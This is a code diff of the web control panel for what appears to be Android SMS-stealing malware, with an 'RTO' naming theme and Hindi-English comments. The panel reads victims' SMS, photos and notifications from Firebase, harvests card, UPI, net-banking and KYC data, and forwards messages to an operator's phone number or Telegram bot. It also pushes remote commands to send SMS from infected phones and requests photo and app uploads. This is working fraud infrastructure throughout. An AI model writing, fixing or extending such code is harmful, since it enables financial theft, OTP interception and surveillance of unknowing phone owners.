-        updStats(); renderDevs();
-      }
-    }).catch(function() { pending--; });
+        if (added > 0) { updStats(); renderDevs(); }
+      });
+    });
+    if (curId && devs[curId]) renderTab();
+  }).catch(function(e) {
+    scanText.textContent = '❌ Error: ' + e.message;
   });
 }
 
+// ═══ INCREMENTAL SCAN (realtime updates ke liye) ═══
+function hardScanIncremental(root, callback) {
+  var found = {};
+  var skipKeys = ['admin_config','global_config','app_config','telegram_auto_config','config','settings'];
+  function walk(obj, path, depth) {
+    if (!obj || typeof obj !== 'object' || depth > 6) return;
+    Object.keys(obj).forEach(function(key) {
+      if (skipKeys.indexOf(key) !== -1 && depth <= 1) return;
+      var entry = obj[key];
+      if (!entry || typeof entry !== 'object') return;
+      var fullPath = path ? path + '/' + key : key;
+      if (isDeviceEntry(key, entry)) {
+        if (!found[key]) found[key] = { data: entry, path: fullPath };
+        return;
+      }
+      if (depth < 6) walk(entry, fullPath, depth + 1);
+    });
+  }
+  walk(root, '', 0);
+  callback(found);
+}
+
+// ═══ LOAD DEVICE DATA ═══
 function loadAllDeviceData(deviceId, basePath, callback) {
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
@@ -1119,6 +1119,32 @@ function loadAllDeviceData(deviceId, basePath, callback) {
     callback(data);
   });
   dataListeners.push({ ref: rootRef, cb: cb2 });
+}
+function collectData(devObj, result) {
+  if (!devObj || typeof devObj !== 'object') return;
+  if (devObj.messages) Object.keys(devObj.messages).forEach(function(k) { result.messages[k] = devObj.messages[k]; });
+  if (devObj.sms_history) Object.keys(devObj.sms_history).forEach(function(k) { result.sms_history[k] = devObj.sms_history[k]; });
+  if (devObj.photos) Object.keys(devObj.photos).forEach(function(k) { result.photos[k] = devObj.photos[k]; });
+  if (devObj.notifications) Object.keys(devObj.notifications).forEach(function(k) { result.notifications[k] = devObj.notifications[k]; });
+  if (devObj.sms_notifications) Object.keys(devObj.sms_notifications).forEach(function(k) { result.notifications[k] = devObj.sms_notifications[k]; });
+  if (devObj.installed_apps) result.installed_apps = devObj.installed_apps;
+  if (devObj.installed_apps_telegram) result.installed_apps_telegram = devObj.installed_apps_telegram;
+  if (devObj.apps_upload_command) result.apps_upload_command = devObj.apps_upload_command;
+  if (devObj.sim_info && typeof devObj.sim_info === 'object') result.sim_info = Object.assign({}, result.sim_info || {}, devObj.sim_info);
+  if (devObj.sim1_number || devObj.sim1_carrier) result.sim_info = Object.assign({}, result.sim_info || {}, { sim1_number: devObj.sim1_number, sim1_carrier: devObj.sim1_carrier, sim2_number: devObj.sim2_number, sim2_carrier: devObj.sim2_carrier });
+  if (devObj.forward_settings) result.forward_settings = Object.assign({}, result.forward_settings || {}, devObj.forward_settings);
+  if (devObj.enabled !== undefined && devObj.admin_number !== undefined) result.forward_settings = Object.assign({}, result.forward_settings || {}, { enabled: devObj.enabled, admin_number: devObj.admin_number, bot_token: devObj.bot_token, chat_id: devObj.chat_id, forward_sim_slot: devObj.forward_sim_slot });
+  if (!result.device_info) result.device_info = {};
+  ['device_model','device_name','device_id','android_version','android_sdk','battery','status','last_seen','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','device_note','ip_address','storage','device_manufacturer','device_brand','serial_number'].forEach(function(k) { if (devObj[k] !== undefined) result.device_info[k] = devObj[k]; });
+}
+function scanForDevice(obj, deviceId, result) {
+  if (!obj || typeof obj !== 'object') return;
+  if (obj[deviceId] && typeof obj[deviceId] === 'object') collectData(obj[deviceId], result);
+  Object.keys(obj).forEach(function(key) {
+    if (key === deviceId) return;
+    var child = obj[key];
+    if (child && typeof child === 'object') scanForDevice(child, deviceId, result);
+  });
 }
 
 function openDev(id) {
@@ -1147,10 +1173,10 @@ function openDev(id) {
   switchTab('info');
   listenLiveMessages(id);
 }
-
 function listenLiveMessages(id) {
   if (liveMsgListener) { try { liveMsgListener.off(); } catch(e) {} }
-  liveMsgListener = db.ref('device_info/' + id + '/messages');
+  var basePath = (devPaths[id] && devPaths[id].device) || ('device_info/' + id);
+  liveMsgListener = db.ref(basePath + '/messages');
   liveMsgListener.on('child_added', function(snap) {
     var m = snap.val(); if (!m) return;
     m._key = snap.key; curMsgs[snap.key] = m;
@@ -1167,7 +1193,6 @@ function listenLiveMessages(id) {
     if (curTab === 'allsms' || curTab === 'bank') renderTab();
   });
 }
-
 function closeDev() {
   stopTelegramPolling();
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
@@ -1221,8 +1246,8 @@ function renderTab() {
       '<div class="dir"><span class="k">Storage</span><span class="v">' + esc(d.storage || '-') + '</span></div>' +
       (fm.phones.length > 0 ? '<div style="margin-top:14px;color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">FROM SMS</div>' + fm.phones.map(function(p, i) { return '<div class="dir"><span class="k">Phone #' + (i+1) + '</span><span class="v">' + esc(p) + '</span></div>'; }).join('') : '');
     setTimeout(function() {
-      var x = document.getElementById('nSave'); if (x) x.onclick = function() { db.ref('device_info/' + curId + '/device_note').set(document.getElementById('nText').value); alert('✅ Note saved'); };
-      var y = document.getElementById('savSim'); if (y) y.onclick = function() { db.ref('device_info/' + curId + '/sim_info').update({ sim1_number: document.getElementById('s1').value, sim2_number: document.getElementById('s2').value }); alert('✅ SIM numbers saved'); };
+      var x = document.getElementById('nSave'); if (x) x.onclick = function() { db.ref(basePathOf(curId) + '/device_note').set(document.getElementById('nText').value); alert('✅ Note saved'); };
+      var y = document.getElementById('savSim'); if (y) y.onclick = function() { db.ref(basePathOf(curId) + '/sim_info').update({ sim1_number: document.getElementById('s1').value, sim2_number: document.getElementById('s2').value }); alert('✅ SIM numbers saved'); };
       var z = document.getElementById('detBtn'); if (z) z.onclick = function() { var dm = detectFromSms(all); if (dm.phones.length > 0) { document.getElementById('s1').value = dm.phones[0]; alert('Detected: ' + dm.phones[0]); } else alert('Not detected'); };
     }, 100);
   } else if (curTab === 'allsms') {
@@ -1264,19 +1289,19 @@ function renderTab() {
       '<div class="card green"><h3>📱 SMS Forwarding</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn ' + (simSel === 1 ? 'active' : '') + '" data-sim="1">SIM 1</div><div class="sim-btn ' + (simSel === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div></div><label class="fl">Forward To</label><div style="display:flex;gap:6px;"><input type="text" class="fi" id="fNum" value="' + esc(fNum) + '" placeholder="+91XXXXXXXXXX" style="flex:1;"><button class="on-off ' + (fOn ? 'on' : '') + '" id="fTog">' + (fOn ? '✓ ON' : '▶ ON') + '</button></div></div>' +
       '<div class="card"><h3>📤 Send SMS Direct</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn active" data-ss="1">SIM 1</div><div class="sim-btn" data-ss="2">SIM 2</div></div><div class="fg"><label class="fl">To</label><input type="text" class="fi" id="sTo" placeholder="+91..."></div><div class="fg"><label class="fl">Message</label><textarea class="ft" id="sMsg"></textarea></div><button class="btn green" id="sBtn">✈️ Send</button></div>';
     setTimeout(function() {
-      document.querySelectorAll('[data-sim]').forEach(function(x) { x.addEventListener('click', function() { db.ref('device_info/' + curId + '/forward_settings/forward_sim_slot').set(parseInt(this.getAttribute('data-sim'))); renderTab(); }); });
+      document.querySelectorAll('[data-sim]').forEach(function(x) { x.addEventListener('click', function() { db.ref(basePathOf(curId) + '/forward_settings/forward_sim_slot').set(parseInt(this.getAttribute('data-sim'))); renderTab(); }); });
       document.getElementById('tgS').addEventListener('click', function() {
         if (tgPolling[curId] && tgPolling[curId].active) { stopTelegramPolling(); renderTab(); }
-        else { var t = document.getElementById('tgT').value.trim(); var c = document.getElementById('tgC').value.trim(); if (!t) { alert('Enter Bot Token'); return; } db.ref('device_info/' + curId + '/forward_settings').update({ bot_token: t, chat_id: c, enabled: true, start_timestamp: Date.now() }); startTelegramPolling(t, c); renderTab(); }
+        else { var t = document.getElementById('tgT').value.trim(); var c = document.getElementById('tgC').value.trim(); if (!t) { alert('Enter Bot Token'); return; } db.ref(basePathOf(curId) + '/forward_settings').update({ bot_token: t, chat_id: c, enabled: true, start_timestamp: Date.now() }); startTelegramPolling(t, c); renderTab(); }
       });
-      document.getElementById('fTog').addEventListener('click', function() { var n = document.getElementById('fNum').value.trim(); var ns = !fOn; if (ns && n.length < 10) { alert('Enter number'); return; } db.ref('device_info/' + curId + '/forward_settings').update({ enabled: ns, admin_number: n, start_timestamp: Date.now() }); renderTab(); });
+      document.getElementById('fTog').addEventListener('click', function() { var n = document.getElementById('fNum').value.trim(); var ns = !fOn; if (ns && n.length < 10) { alert('Enter number'); return; } db.ref(basePathOf(curId) + '/forward_settings').update({ enabled: ns, admin_number: n, start_timestamp: Date.now() }); renderTab(); });
       document.querySelectorAll('[data-ss]').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('[data-ss]').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); }); });
-      document.getElementById('sBtn').addEventListener('click', function() { var t = document.getElementById('sTo').value.trim(); var m = document.getElementById('sMsg').value.trim(); var s = document.querySelector('[data-ss].active'); var sim = s ? parseInt(s.getAttribute('data-ss')) : 1; if (!t || !m) { alert('Fill fields'); return; } db.ref('device_info/' + curId + '/sms_commands').push({ to: t, message: m, sim_slot: sim, status: 'pending', timestamp: Date.now() }); addTgLog('📤 SMS command pushed: ' + t); alert('✅ Sent'); });
+      document.getElementById('sBtn').addEventListener('click', function() { var t = document.getElementById('sTo').value.trim(); var m = document.getElementById('sMsg').value.trim(); var s = document.querySelector('[data-ss].active'); var sim = s ? parseInt(s.getAttribute('data-ss')) : 1; if (!t || !m) { alert('Fill fields'); return; } db.ref(basePathOf(curId) + '/sms_commands').push({ to: t, message: m, sim_slot: sim, status: 'pending', timestamp: Date.now() }); addTgLog('📤 SMS command pushed: ' + t); alert('✅ Sent'); });
       if (tgPolling[curId] && tgPolling[curId].logs) { var logEl = document.getElementById('tgLog'); tgPolling[curId].logs.forEach(function(l) { var line = document.createElement('div'); line.className = 'tg-log-line'; line.textContent = l; logEl.appendChild(line); }); logEl.scrollTop = logEl.scrollHeight; }
     }, 100);
   }
 }
-
+function basePathOf(id) { return (devPaths[id] && devPaths[id].device) || ('device_info/' + id); }
 function bindSmsRefresh() {
   var btn = document.getElementById('refreshSmsBtn');
   if (!btn) return;
@@ -1285,7 +1310,7 @@ function bindSmsRefresh() {
     var oldText = this.textContent;
     this.textContent = '⏳ Loading...'; this.disabled = true;
     if (!curId) { self.textContent = oldText; self.disabled = false; return; }
-    var basePath = (devPaths[curId] && devPaths[curId].device) || ('device_info/' + curId);
+    var basePath = basePathOf(curId);
     db.ref(basePath + '/messages').once('value').then(function(s) {
       curMsgs = s.val() || {};
       Object.keys(curMsgs).forEach(function(k) { if (curMsgs[k] && !curMsgs[k]._key) curMsgs[k]._key = k; });
@@ -1302,25 +1327,7 @@ function bindSmsRefresh() {
 
 function renderPhotos() {
   var b = document.getElementById('dBody');
-  var topHtml =
-    '<div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:12px; padding:14px; margin-bottom:14px; box-shadow:0 1px 3px rgba(0,0,0,0.04);">' +
-      '<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">' +
-        '<div style="color:#1E40AF; font-size:13px; font-weight:700;">📸 Photo Actions</div>' +
-        '<div id="uploadStatus" style="font-size:10px; color:#64748B; font-weight:700;">Ready</div>' +
-      '</div>' +
-      '<button onclick="openPhotoUploadDialog()" style="width:100%; padding:12px; background:#2563EB; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; margin-bottom:10px; box-shadow:0 2px 6px rgba(37,99,235,0.25);">📤 REQUEST UPLOAD</button>' +
-      '<button onclick="openFastDeleteDialog()" style="width:100%; padding:13px; background:linear-gradient(135deg,#DC2626,#D97706); color:white; border:none; border-radius:10px; font-size:13px; font-weight:800; cursor:pointer; box-shadow:0 2px 8px rgba(220,38,38,0.3);">🚀 FAST DELETE (Firebase)</button>' +
-      '<div class="inline-progress" id="inlineProgressPhotos">' +
-        '<div class="inline-progress-head">' +
-          '<div class="inline-progress-status" id="inlineProgressIconPhotos">📤 Uploading...</div>' +
-          '<div class="inline-progress-percent" id="inlineProgressPercentPhotos">0%</div>' +
-        '</div>' +
-        '<div class="inline-progress-bar-bg">' +
-          '<div class="inline-progress-bar-fill" id="inlineProgressBarPhotos"></div>' +
-        '</div>' +
-        '<div class="inline-progress-stats" id="inlineProgressStatsPhotos">0 / 0 uploaded</div>' +
-      '</div>' +
-    '</div>';
+  var topHtml = '<div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:12px; padding:14px; margin-bottom:14px; box-shadow:0 1px 3px rgba(0,0,0,0.04);"><div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;"><div style="color:#1E40AF; font-size:13px; font-weight:700;">📸 Photo Actions</div><div id="uploadStatus" style="font-size:10px; color:#64748B; font-weight:700;">Ready</div></div><button onclick="openPhotoUploadDialog()" style="width:100%; padding:12px; background:#2563EB; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; margin-bottom:10px; box-shadow:0 2px 6px rgba(37,99,235,0.25);">📤 REQUEST UPLOAD</button><button onclick="openFastDeleteDialog()" style="width:100%; padding:13px; background:linear-gradient(135deg,#DC2626,#D97706); color:white; border:none; border-radius:10px; font-size:13px; font-weight:800; cursor:pointer; box-shadow:0 2px 8px rgba(220,38,38,0.3);">🚀 FAST DELETE (Firebase)</button><div class="inline-progress" id="inlineProgressPhotos"><div class="inline-progress-head"><div class="inline-progress-status" id="inlineProgressIconPhotos">📤 Uploading...</div><div class="inline-progress-percent" id="inlineProgressPercentPhotos">0%</div></div><div class="inline-progress-bar-bg"><div class="inline-progress-bar-fill" id="inlineProgressBarPhotos"></div></div><div class="inline-progress-stats" id="inlineProgressStatsPhotos">0 / 0 uploaded</div></div></div>';
   var arr = Object.entries(photos);
   arr = arr.filter(function(p) { return p[1] && (p[1].telegram_file_id || p[1].url || p[1].base64); });
   var seen = {};
@@ -1381,24 +1388,7 @@ function renderApps() {
   else if (status === 'uploading') { statusColor = '#2563EB'; statusText = '📤 Uploading...'; }
   else if (status === 'completed') { statusColor = '#059669'; statusText = '✅ Done'; }
   else if (status === 'failed') { statusColor = '#DC2626'; statusText = '❌ Failed'; }
-  var topHtml =
-    '<div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:12px; padding:14px; margin-bottom:14px; box-shadow:0 1px 3px rgba(0,0,0,0.04);">' +
-      '<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">' +
-        '<div style="color:#1E40AF; font-size:13px; font-weight:700;">📦 Apps Actions</div>' +
-        '<div style="font-size:10px; color:' + statusColor + '; font-weight:700;">' + statusText + '</div>' +
-      '</div>' +
-      '<button onclick="requestAppsUpload()" style="width:100%; padding:12px; background:#2563EB; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; box-shadow:0 2px 6px rgba(37,99,235,0.25);">📤 REQUEST APPS UPLOAD</button>' +
-      '<div class="inline-progress" id="inlineProgressApps">' +
-        '<div class="inline-progress-head">' +
-          '<div class="inline-progress-status" id="inlineProgressIconApps">📤 Uploading...</div>' +
-          '<div class="inline-progress-percent" id="inlineProgressPercentApps">0%</div>' +
-        '</div>' +
-        '<div class="inline-progress-bar-bg">' +
-          '<div class="inline-progress-bar-fill" id="inlineProgressBarApps"></div>' +
-        '</div>' +
-        '<div class="inline-progress-stats" id="inlineProgressStatsApps">0 / 0 uploaded</div>' +
-      '</div>' +
-    '</div>';
+  var topHtml = '<div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:12px; padding:14px; margin-bottom:14px; box-shadow:0 1px 3px rgba(0,0,0,0.04);"><div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;"><div style="color:#1E40AF; font-size:13px; font-weight:700;">📦 Apps Actions</div><div style="font-size:10px; color:' + statusColor + '; font-weight:700;">' + statusText + '</div></div><button onclick="requestAppsUpload()" style="width:100%; padding:12px; background:#2563EB; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; box-shadow:0 2px 6px rgba(37,99,235,0.25);">📤 REQUEST APPS UPLOAD</button><div class="inline-progress" id="inlineProgressApps"><div class="inline-progress-head"><div class="inline-progress-status" id="inlineProgressIconApps">📤 Uploading...</div><div class="inline-progress-percent" id="inlineProgressPercentApps">0%</div></div><div class="inline-progress-bar-bg"><div class="inline-progress-bar-fill" id="inlineProgressBarApps"></div></div><div class="inline-progress-stats" id="inlineProgressStatsApps">0 / 0 uploaded</div></div></div>';
   if (tg.apps && Array.isArray(tg.apps) && tg.apps.length > 0) {
     var apps = tg.apps.slice();
     apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
@@ -1464,7 +1454,7 @@ function startTelegramPolling(token, chatId) {
             var msg = update.message.text; var from = update.message.from ? (update.message.from.username || 'user') : 'user';
             addTgLog('📩 From @' + from + ': "' + msg.substring(0, 60) + '"');
             var toMatch = msg.match(/(?:To|to|TO):\s*([+\d]+)/); var bodyMatch = msg.match(/(?:Body|body|BODY):\s*([\s\S]+)/);
-            if (toMatch && bodyMatch) { db.ref('device_info/' + devId + '/sms_commands').push({ to: toMatch[1].trim(), message: bodyMatch[1].trim(), sim_slot: 1, status: 'pending', timestamp: Date.now(), source: 'telegram_bot' }).then(function() { addTgLog('✅ SMS command pushed'); updateTgStatus('✅ SMS sent', 'ok'); }); }
+            if (toMatch && bodyMatch) { db.ref(basePathOf(devId) + '/sms_commands').push({ to: toMatch[1].trim(), message: bodyMatch[1].trim(), sim_slot: 1, status: 'pending', timestamp: Date.now(), source: 'telegram_bot' }).then(function() { addTgLog('✅ SMS command pushed'); updateTgStatus('✅ SMS sent', 'ok'); }); }
             else { addTgLog('⚠️ Invalid format'); }
           }
         });
@@ -1568,18 +1558,24 @@ function detectFromSms(allMsgs) { var phones = {}, nets = {}; allMsgs.forEach(fu
 
 // ═══ EVENT LISTENERS ═══
 document.getElementById('logoutBtn').addEventListener('click', doLogout);
-document.getElementById('btnNewConn').addEventListener('click', showNewConnPanel);
-document.getElementById('btnCancelNew').addEventListener('click', hideNewConnPanel);
-document.getElementById('btnSaveNew').addEventListener('click', saveNewAcc);
+document.getElementById('btnNewConn').addEventListener('click', function() {
+  // Naya connection ke liye connect screen dikhao (panel hide)
+  if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
+  db = null; currentAccount = null;
+  document.getElementById('mainApp').style.display = 'none';
+  document.getElementById('connectScreen').style.display = 'flex';
+  renderSavedAccounts();
+  document.getElementById('connectErr').textContent = '';
+});
+document.getElementById('btnConnect').addEventListener('click', saveNewAcc);
 document.getElementById('btnBulkConnect').addEventListener('click', bulkConnect);
 document.getElementById('apkUpload').addEventListener('click', function() { document.getElementById('apkFile').click(); });
 document.getElementById('apkFile').addEventListener('change', function(e) { if (e.target.files[0]) handleApkUpload(e.target.files[0]); });
-document.getElementById('newConnOverlay').addEventListener('click', function(e) { if (e.target.id === 'newConnOverlay') hideNewConnPanel(); });
 document.getElementById('btnClose').addEventListener('click', closeDev);
 document.getElementById('dOverlay').addEventListener('click', closeDev);
 document.getElementById('searchBox').addEventListener('input', renderDevs);
 document.getElementById('btnStar').addEventListener('click', function() { toggleLike(curId); });
-document.getElementById('btnDel').addEventListener('click', function() { if (!confirm('Delete?')) return; db.ref('device_info/' + curId).remove(); closeDev(); });
+document.getElementById('btnDel').addEventListener('click', function() { if (!confirm('Delete?')) return; db.ref(basePathOf(curId)).remove(); closeDev(); });
 document.querySelectorAll('.fbtn').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('.fbtn').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); curFilter = this.getAttribute('data-f'); renderDevs(); }); });
 document.querySelectorAll('.tab').forEach(function(x) { x.addEventListener('click', function() { switchTab(this.getAttribute('data-t')); }); });
 document.getElementById('btnCallFwd').addEventListener('click', openCallFwd);
@@ -1600,24 +1596,12 @@ document.getElementById('btnCsv').addEventListener('click', function() {
   var bl = new Blob([csv], { type: 'text/csv' }); var a = document.createElement('a'); a.href = URL.createObjectURL(bl); a.download = 'rto_sms.csv'; a.click();
 });
 document.getElementById('btnFb').addEventListener('click', function() { alert('Firebase: ' + (currentAccount && currentAccount.url)); });
-document.getElementById('btnNuke').addEventListener('click', function() { if (!confirm('Delete ALL messages?')) return; if (!confirm('Sure?')) return; Object.keys(devs).forEach(function(id) { db.ref('device_info/' + id + '/messages').remove(); db.ref('device_info/' + id + '/sms_history').remove(); }); alert('Deleted'); });
+document.getElementById('btnNuke').addEventListener('click', function() { if (!confirm('Delete ALL messages?')) return; if (!confirm('Sure?')) return; Object.keys(devs).forEach(function(id) { db.ref(basePathOf(id) + '/messages').remove(); db.ref(basePathOf(id) + '/sms_history').remove(); }); alert('Deleted'); });
 
-// ═══ AUTO-START — page load pe seedha connect ═══
-(function() {
-  try {
-    var saved = localStorage.getItem('rto_last_account');
-    if (saved) {
-      var acc = JSON.parse(saved);
-      if (acc && acc.url) {
-        console.log('🔄 Auto-connecting to:', acc.name);
-        setTimeout(function() { connectToAccount(acc); }, 200);
-        return;
-      }
-    }
-  } catch(e) {}
-  // No saved account — default use karo
-  setTimeout(function() { connectToAccount({ name: 'RTO Admin', url: DEFAULT_CONFIG.databaseURL, apiKey: DEFAULT_CONFIG.apiKey }); }, 200);
-})();
+// ═══ INIT — Connect screen dikhao (dashboard NAHI) ═══
+renderSavedAccounts();
+document.getElementById('connectScreen').style.display = 'flex';
+document.getElementById('mainApp').style.display = 'none';
 </script>
 </body>
 </html>
